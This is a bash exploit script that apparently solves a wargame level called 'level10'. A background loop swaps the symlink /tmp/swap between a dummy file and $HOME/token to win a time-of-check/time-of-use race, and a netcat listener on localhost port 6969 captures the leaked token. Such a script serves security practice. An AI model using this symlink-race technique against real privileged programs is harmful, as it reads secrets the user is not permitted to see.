#!/bin/bash

OUT=/tmp/flag
: >"$OUT"

# Listener (adjust flags if your nc variant needs -p)
nc -lk 6969 >"$OUT" &
NC_PID=$!

cleanup() {
  kill "$NC_PID" 2>/dev/null || true
  kill "$SWAP_PID" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

touch /tmp/dummy
ln -sf /tmp/dummy /tmp/swap

# Tight swapper loop (single background process)
while true; do
  ln -sf /tmp/dummy /tmp/swap
  ln -sf "$HOME/token" /tmp/swap
done &
SWAP_PID=$!

# Give nc a moment to bind
sleep 0.1

# Keep trying
while true; do
  # Capture both stdout+stderr so your test is consistent
    output=$(./level10 /tmp/swap 127.0.0.1 2>&1 || true)
    echo "Received:"
    cat "$OUT"
    sleep 0.01
done